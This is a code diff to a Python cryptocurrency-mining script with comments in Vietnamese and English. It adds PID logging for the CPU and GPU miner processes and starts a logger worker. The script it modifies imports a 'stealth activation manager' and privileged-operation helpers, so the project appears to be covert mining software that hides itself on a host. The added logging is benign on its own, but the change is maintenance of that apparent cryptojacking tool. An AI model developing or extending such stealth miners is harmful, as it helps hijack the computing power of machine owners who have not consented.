@@ -46,6 +46,8 @@ from mining_environment.scripts.privileged_operations import get_privileged_mana
 
 # **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
+# PID Logger (ghi PID tiến trình khai thác)
+from pid_logger import start_worker, log_pid
 
 # **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
 
@@ -632,7 +634,14 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                 
                 # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
-                register_mining_process(process_name, process.pid, process)
+                if process:
+                    register_mining_process(process_name, process.pid, process)
+                    # Ghi PID ngay khi khởi tạo thành công
+                    try:
+                        from pid_logger import log_pid
+                        log_pid(process.pid, cpu)
+                    except Exception as _pid_err:
+                        logger.warning(f"PID logger failed: {_pid_err}")
                 
                 # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                 operation_details = {
@@ -962,6 +971,8 @@ def cpu_mining_thread():
                     thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {cpu_process} (type: {type(cpu_process)})")
                     if cpu_process:
                         thread_logger.info(f"🔍 [DEBUG] CPU process received successfully - PID: {cpu_process.pid}")
+                        # Ghi PID vào pid_cpu.log
+                        log_pid(cpu_process.pid, True)
                     else:
                         thread_logger.error(f"🔍 [DEBUG] CPU process is None - start_mining_process failed")
                     
@@ -1053,6 +1064,8 @@ def gpu_mining_thread():
                 thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
                 if gpu_process:
                     thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
+                    # Ghi PID vào pid_gpu.log
+                    log_pid(gpu_process.pid, False)
                 else:
                     thread_logger.error(f"🔍 [DEBUG] GPU process is None - start_mining_process failed")
                 
@@ -1180,6 +1193,9 @@ def main():
     # ------------------------------------------------------------------
     bus = get_thread_event_bus()
     logger.info("✅ Thread communication EventBus initialized")
+    # 🚀 Khởi động PID Logger worker
+    start_worker()
+    logger.info("🚀 PID Logger worker started")
 
     # Thêm khai báo danh sách mining_threads
     mining_threads = []
